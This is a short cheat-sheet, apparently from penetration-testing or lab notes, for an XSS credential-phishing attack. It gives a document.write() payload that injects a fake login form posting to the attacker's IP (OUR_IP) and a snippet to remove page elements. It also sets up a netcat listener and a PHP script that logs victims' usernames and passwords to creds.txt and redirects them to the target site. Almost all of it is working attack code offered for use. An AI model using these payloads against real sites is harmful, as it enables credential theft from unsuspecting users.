
## Login Form Injection Payload

JavaScript Code to take user credentials using a Login form (username and password). `document.write()` is used to write some text directly to the HTML output. Here `OUR_IP` should be the attacker's IP or our own VM IP so that we can receive the credentials entered by the victim.

```html
document.write('<h3>Please login to continue</h3><form action=http://[OUR_IP]><input type="username" name="username" placeholder="Username"><input type="password" name="password" placeholder="Password"><input type="submit" name="submit" value="Login"></form>');
```


## Cleaning Up Payload

Removing a certain DOM element by its id name using JavaScript.

```js
document.getElementById('<id_name>').remove();
```


## Setting up Listener


### using `netcat`

```bash
sudo nc -lvnp 80
```

### using `PHP` script

- Create a `index.php` file and store the below PHP code there. Should be present inside `/tmp/tmpserver` and if doesn't exist then create it.

```php
<?php
if (isset($_GET['username']) && isset($_GET['password'])) {
    $file = fopen("creds.txt", "a+");
    fputs($file, "Username: {$_GET['username']} | Password: {$_GET['password']}\n");
    header("Location: http://<TARGET IP>/phishing/index.php");
    fclose($file);
    exit();
}
?>
```

- After storing the PHP script, start a temporary PHP server.

```bash
mkdir /tmp/tmpserver
cd /tmp/tmpserver
vim index.php # store the above PHP script mentioned above
sudo php -S 0.0.0.0:80
```

- If our PHP script receives the user credentials it will store them inside the `creds.txt` file.